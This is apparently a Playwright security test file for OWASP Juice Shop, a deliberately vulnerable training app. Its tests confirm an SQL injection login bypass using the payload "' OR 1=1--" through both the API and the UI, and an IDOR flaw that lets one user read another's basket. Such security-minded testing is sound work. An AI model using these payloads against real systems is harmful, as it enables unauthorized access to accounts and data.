import { test, expect } from '../../src/fixtures/index.js';
import { LoginPage } from '../../src/pages/login.page.js';
import { makeUser } from '../../src/data/factories/user.factory.js';
import { KNOWN_PRODUCTS } from '../../src/data/constants.js';

/**
 * Security-aware "smoke" tests against OWASP Juice Shop, which is INTENTIONALLY
 * vulnerable for training. These tests assert the *current* (vulnerable)
 * behaviour so they stay green while clearly documenting the finding — in a
 * hardened application each assertion's comment states what the secure result
 * should be. This demonstrates security-minded test design, not an attack on a
 * third-party system.
 */
test.describe('Security smoke @security', () => {
  test(
    'SQL injection in the login endpoint bypasses authentication',
    { tag: ['@security', '@api', '@regression'] },
    async ({ request }) => {
      const res = await request.post('/rest/user/login', {
        headers: { 'Content-Type': 'application/json' },
        data: { email: "' OR 1=1--", password: 'anything' },
      });

      // FINDING: a secure app must return 401 here. Juice Shop returns 200 and
      // issues a valid session — a classic SQLi authentication bypass.
      expect(res.status()).toBe(200);
      const body = await res.json();
      expect(body.authentication?.token?.split('.')).toHaveLength(3);
    }
  );

  test(
    'SQL injection in the login form logs in without valid credentials',
    { tag: ['@security', '@regression'] },
    async ({ page }) => {
      const login = new LoginPage(page);
      await login.goto();
      await login.login("' OR 1=1--", 'anything');

      // FINDING: the injection authenticates the session via the UI as well.
      await login.navbar.openAccountMenu();
      await expect(login.navbar.logoutMenuButton).toBeVisible();
    }
  );

  test(
    "IDOR: an authenticated user can read another user's basket",
    { tag: ['@security', '@api', '@regression'] },
    async ({ authApi, basketApi, session }) => {
      // `session` is user A. Create user B and put an item in their basket.
      const userB = makeUser();
      const sessionB = await authApi.createAndLogin(userB);
      basketApi.setToken(sessionB.token);
      await basketApi.addItemRaw(sessionB.bid, KNOWN_PRODUCTS.appleJuice.id, 1);

      // User A requests user B's basket with A's own token.
      basketApi.setToken(session.token);
      const res = await basketApi.getRaw(sessionB.bid);

      // FINDING: a secure app must return 401/403 (broken object-level auth).
      // Juice Shop returns 200 — documenting the IDOR vulnerability.
      expect(res.status()).toBe(200);
    }
  );
});
